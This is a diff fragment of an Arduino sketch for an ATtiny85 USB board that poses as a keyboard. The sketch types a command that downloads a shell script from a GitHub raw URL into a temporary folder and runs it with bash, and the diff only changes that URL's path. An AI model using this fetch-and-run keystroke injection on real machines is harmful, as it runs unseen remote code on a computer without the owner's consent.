@@ -23,7 +23,7 @@ void loop() {
   DigiKeyboard.print(" \"$( ");
   // Downloads the script
   DigiKeyboard.print("curl \"");
-  DigiKeyboard.print("https://raw.githubusercontent.com/msr8/attiny85/main/scripts/bash/speak.sh");
+  DigiKeyboard.print("https://raw.githubusercontent.com/msr8/attiny85/main/Shell%20Scripts/bash/speak.sh");
   DigiKeyboard.print("\" > $TMPDIR/16691615; " );
   // Runs it
   DigiKeyboard.print("bash $TMPDIR/16691615; ");
